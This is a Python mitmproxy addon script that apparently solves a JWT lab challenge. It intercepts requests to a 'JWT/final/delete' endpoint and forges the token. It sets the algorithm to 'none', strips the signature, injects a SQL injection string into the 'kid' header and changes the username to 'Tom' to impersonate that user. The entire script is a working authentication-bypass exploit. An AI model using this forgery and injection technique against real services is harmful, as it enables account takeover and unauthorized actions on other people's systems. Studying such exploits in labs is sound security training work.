from mitmproxy import http
from mitmproxy import ctx

import re
import base64
import json

import requests


def base64_to_dict(encoded):
  decoded = base64.urlsafe_b64decode(encoded + '=')
  return json.loads(decoded)

def dict_to_base64(decoded) -> str:
  stringified = json.dumps(decoded, separators=(',', ':'))  
  return (
    base64.b64encode(stringified.encode('utf-8'))).replace(b'=', b'').decode('utf-8')

def request(flow: http.HTTPFlow) -> None:
  if 'JWT/final/delete' in flow.request.url:
    token = re.findall(r'token=([\w.]+)', flow.request.url)[0]
    header, payload, signature = token.split('.')
    header = base64_to_dict(header)
    payload = base64_to_dict(payload)

    header['alg'] = 'none'
    header['kid'] = " 1111 or 'username' = 'Tom' -- "
    payload['username'] = 'Tom'

    new_token = f'{dict_to_base64(header)}.{dict_to_base64(payload)}.'
    new_url = flow.request.url.split('token=')[0] + 'token=' + new_token
    flow.request.headers['Authorization'] = token
    flow.request.url = new_url
